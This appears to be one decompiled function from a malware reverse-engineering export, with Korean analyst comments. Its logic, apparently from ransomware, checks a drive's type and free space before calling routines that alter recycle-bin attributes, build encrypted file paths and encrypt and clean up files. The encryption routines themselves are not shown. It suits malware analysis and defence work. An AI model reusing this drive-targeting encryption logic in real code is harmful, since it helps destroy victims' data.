// --- Metadata ---
// Function Name: CheckDriveAndEncryptFiles_10005540
// Address: 0x10005540
// Exported At: 20250522_122253
// Signature: unknown_signature
// ---------------
void __cdecl CheckDriveAndEncryptFiles_10005540(int mainObject, LONG Value, int a3)
{
  int v3; // esi
  UINT (__stdcall *v4)(LPCWSTR); // esi
  WCHAR DirectoryName[2]; // [esp+10h] [ebp-228h] BYREF
  int v6; // [esp+14h] [ebp-224h]
  ULARGE_INTEGER TotalNumberOfBytes; // [esp+18h] [ebp-220h] BYREF
  ULARGE_INTEGER TotalNumberOfFreeBytes; // [esp+20h] [ebp-218h] BYREF
  ULARGE_INTEGER FreeBytesAvailableToCaller; // [esp+28h] [ebp-210h] BYREF
  wchar_t Source; // [esp+30h] [ebp-208h] BYREF
  char v11[516]; // [esp+32h] [ebp-206h] BYREF
  __int16 v12; // [esp+236h] [ebp-2h]

  DirectoryName[1] = HIWORD(dword_1000D7A4);    // 드라이브 문자를 받아 해당 드라이브 상태를 확인 
  v6 = dword_1000D7A8;
  DirectoryName[0] = Value + 65;
  if ( a3 )                                     // 로컬 드라이브에 대해 암호화 및 정리 작업 
  {
    v4 = GetDriveTypeW;
    if ( GetDriveTypeW(DirectoryName) == 5 )
      return;
    InterlockedExchange(&Target, Value);
    goto LABEL_12;
  }
  if ( InterlockedExchangeAdd(&Target, 0) != Value )
  {
    v3 = 0;
    while ( !GetDiskFreeSpaceExW(
               DirectoryName,
               &FreeBytesAvailableToCaller,
               &TotalNumberOfBytes,
               &TotalNumberOfFreeBytes)
         || !TotalNumberOfBytes.QuadPart )
    {
      Sleep(0x3E8u);
      if ( ++v3 >= 30 )
        return;
    }
    v4 = GetDriveTypeW;
    if ( GetDriveTypeW(DirectoryName) != 5 )
    {
LABEL_12:
      if ( v4(DirectoryName) == 3 )
      {
        Source = 0;
        memset(v11, 0, sizeof(v11));
        v12 = 0;
        runAttribInRecyclePath_10005060(Value, &Source);
        generateEncryptFilePath_10001910((wchar_t *)mainObject, &Source);
      }
      LOWORD(v6) = 0;
      encryptAndCleanupFiles_100027F0((_DWORD *)mainObject, DirectoryName, 1);
      return;
    }
  }
}
